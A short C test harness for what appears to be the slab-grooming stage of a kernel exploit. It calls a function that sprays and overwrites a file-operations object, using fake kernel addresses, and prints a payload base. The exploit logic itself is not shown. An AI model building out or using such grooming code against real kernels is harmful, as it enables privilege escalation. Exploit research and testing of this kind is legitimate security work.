/* Standalone test for groom_and_install_fops_object(), independent of
 * KASLR (uses fake target addresses, harmless -- validates the
 * fork/leak/drain/spray choreography and object-write path without
 * ever depending on the real kernel target being correct). Test harness
 * only, not part of the ported payload flow. */
#include <stdio.h>

#include "05_mm_slab_grooming.h"

int main(void) {
  uint64_t page_base = groom_and_install_fops_object(
      0xffffffc008000000ULL, 0xdeadbeefULL, 0xcafebabeULL);
  if (!page_base) {
    fprintf(stderr, "groom failed\n");
    return 1;
  }
  printf("payload_base=%016llx\n", (unsigned long long)page_base);
  return 0;
}
